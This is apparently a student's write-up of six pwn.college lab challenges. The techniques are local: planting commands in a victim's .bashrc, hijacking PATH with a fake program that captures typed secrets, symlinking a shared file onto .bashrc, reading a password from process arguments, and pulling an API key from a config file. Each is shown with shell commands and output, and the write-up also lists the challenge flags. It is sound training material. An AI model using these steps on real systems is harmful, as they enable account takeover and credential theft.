# BASHRC BACKDOOR
To use victim's `bashrc` and our write access to it to get the flag.

## My solve
**Flag:** `pwn.college{Yhas_cc8cRXBNonUT8-WRgszuR1.0VMzEzNxwiM4kjNzEzW}`

* Using nano editor to edit `/home/zardus/bashrc` and ran `/challenge/victim` to get the flag.

```
hacker@shenanigans~bashrc-backdoor:~$ nano /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{Yhas_cc8cRXBNonUT8-WRgszuR1.0VMzEzNxwiM4kjNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```


# SNIFFING INPUT
This challenge is to use victims's `bashrc` to get the flag .This time we have to hijack a command flag_checker to get the flag.

## My solve
**Flag:** `pwn.college{sIppirRQ8R1A3Y4BxtMYLuje7tr.0VNzEzNxwiM4kjNzEzW}`

* I used `nano` text editor to edit `/home/zardus/.bashrc`

```bash
hacker@shenanigans~sniffing-input:~$ nano /home/zardus/.bashrc
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
PATH=/home/hacker:$PATH
```
* I created `flag_checker` program to replace the existing command in `/home/hacker`
```
hacker@shenanigans~sniffing-input:~$ touch flag_checker && nano flag_checker
#!/bin/bash
echo "Type the flag , victim: "
read flag
echo "Correct!"
echo $flag
hacker@shenanigans~sniffing-input:~$ chmod +x flag_checker
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag , victim:
*************************************************************Correct!
pwn.college{sIppirRQ8R1A3Y4BxtMYLuje7tr.0VNzEzNxwiM4kjNzEzW} 
```
* I ran `/challenge/victim` and got the flag

# OVERSHARED DIRECTORIES
We just have access to directory /home/zardus rather than file /home/zardus/.bashrc

## My solve
**Flag:** `pwn.college{k-F2dOgFAsf3uaOnV5L23jDQZOb.0FM0EzNxwiM4kjNzEzW}`

* similar to the previous challenge , we use nano editor to edit `/home/zardus/.bashrc` .
* we use `rm` to remove `/home/zardus/.bashrc` as we do not have access to the file.
* Instead we create a new file and edit it using nano i.e add `PATH=/home/hacker:$PATH`.
* Next we add executable access and run `/challenge/victim` to get the flag.

```bash
hacker@shenanigans~overshared-directories:~$ nano /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
rm: remove write-protected regular file '/home/zardus/.bashrc'? y
hacker@shenanigans~overshared-directories:~$ nano /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$
hacker@shenanigans~overshared-directories:~$ nano /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ touch flag_checker && nano flag_checker
hacker@shenanigans~overshared-directories:~$ chmod +x flag_checker
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag , victim:
*************************************************************Correct!
pwn.college{k-F2dOgFAsf3uaOnV5L23jDQZOb.0FM0EzNxwiM4kjNzEzW}
```


# TRICKY LINKING
We have access to directory `/tmp/collab` and we have to use zardus pushing the command `cat /flag` to `

## My solve
**Flag:** `pwn.college{874ka5JA4hCEr9wkGsIhBOAcMn5.0VM0EzNxwiM4kjNzEzW}`

* I used `rm` to remove the existing evil-commands file.
* I created a symbolic link between `/home/zardus/.bashrc` and `/tmp/collab/evil-commands.txt` so that we can access sensitive information.
* We ran `/challenge/victim` in order to add `cat /flag` to the `/tmp/collab/evil-commands.txt` file.
* Then, we ran `/challenge/victim` to obtain the flag.

```
hacker@shenanigans~tricky-linking:~$ rm /tmp/collab/evil-commands.txt
rm: remove write-protected regular file '/tmp/collab/evil-commands.txt'? y
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: **********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: **********
pwn.college{874ka5JA4hCEr9wkGsIhBOAcMn5.0VM0EzNxwiM4kjNzEzW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```

# SNIFFING PROCESS ARGUMENTS
Zardus is using an automation script, passing his account password to it as an argument. Zardus is also allowed to use sudo (and, thus, to sudo cat /flag!). Steal the password, log in to Zardus' account (recall the su command from the Untangling Users module), and get that flag.

## My solve
**Flag:** `pwn.college{MszMGh7QgpMnV6vGZolCAPnnhdj.0FOzEzNxwiM4kjNzEzW}`

* Used `ps aux` to find out the password of zardus' account.
* Using `ps_1257818714` as the password of su zardus
* I obtained the flag after running `cat /flag`

```bash
hacker@shenanigans~sniffing-process-arguments:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   1056   640 ?        Ss   09:31   0:00 /sbin/docker-init -- /nix/var/nix/profiles/dojo-workspace/bin/dojo
root           7  0.0  0.0 231708  2560 ?        S    09:31   0:00 /run/dojo/bin/sleep 6h
root         147  0.0  0.0   5204  3200 ?        S    09:31   0:00 su -c auto.sh --user zardus --pass pw_1257818714 zardus
zardus       151  0.0  0.0   4132  2560 ?        Ss   09:31   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw_12578
zardus       152  0.0  0.0 231708  2560 ?        S    09:31   0:00 sleep 6h
hacker       156  0.0  0.0 231576  3520 pts/0    Ss   09:31   0:00 /nix/store/0nxvi9r5ymdlr2p24rjj9qzyms72zld1-bash-interactive-5.2p3
hacker       162  0.0  0.0 231940  4160 pts/0    S+   09:31   0:00 /run/dojo/bin/bash --login
hacker       171  0.0  0.0 231576  3520 pts/1    Ss   09:32   0:00 /nix/store/0nxvi9r5ymdlr2p24rjj9qzyms72zld1-bash-interactive-5.2p3
hacker       177  0.0  0.0 231940  4160 pts/1    S    09:32   0:00 /run/dojo/bin/bash --login
hacker       192  0.0  0.0 231576  3520 pts/1    S+   09:40   0:00 bash auto.sh
hacker       193  0.0  0.0 231708  2560 pts/1    S+   09:40   0:00 sleep 6h
hacker       194  0.0  0.0 231576  3520 pts/2    Ss   09:40   0:00 /nix/store/0nxvi9r5ymdlr2p24rjj9qzyms72zld1-bash-interactive-5.2p3
hacker       200  0.0  0.0 231940  4160 pts/2    S+   09:40   0:00 /run/dojo/bin/bash --login
hacker       217  0.6  0.0 231576  3520 pts/3    Ss   10:49   0:00 /nix/store/0nxvi9r5ymdlr2p24rjj9qzyms72zld1-bash-interactive-5.2p3
hacker       223  0.0  0.0 231940  4160 pts/3    S    10:49   0:00 /run/dojo/bin/bash --login
hacker       232  0.0  0.0 233600  3840 pts/3    R+   10:50   0:00 ps aux
hacker@shenanigans~sniffing-process-arguments:~$ su zardus
Password:
zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag
pwn.college{MszMGh7QgpMnV6vGZolCAPnnhdj.0FOzEzNxwiM4kjNzEzW}
```



# SNOOPING ON CONFIGURATIONS
Steal the API key and use it as an argument to `flag_getter` to obtain the flag

## My solve
**Flag:** `pwn.college{IFfm1F2nz7-SaAYd8bVq-Nh7aYf.0lM0EzNxwiM4kjNzEzW}`

* Use `cat /home/zardus/.bashrc` to obtain the API key
* Then use the key given by `FLAG_GETTER_API_KEY=sk-48927267` as an argument to flag_getter --key to get the flag.

```bash
hacker@shenanigans~snooping-on-configurations:~$ cat /home/zardus/.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
.
.
.
FLAG_GETTER_API_KEY=sk-48927267
hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-48927267
Correct API key! Do you want me to print the flag (y/n)?
y
pwn.college{IFfm1F2nz7-SaAYd8bVq-Nh7aYf.0lM0EzNxwiM4kjNzEzW}
```



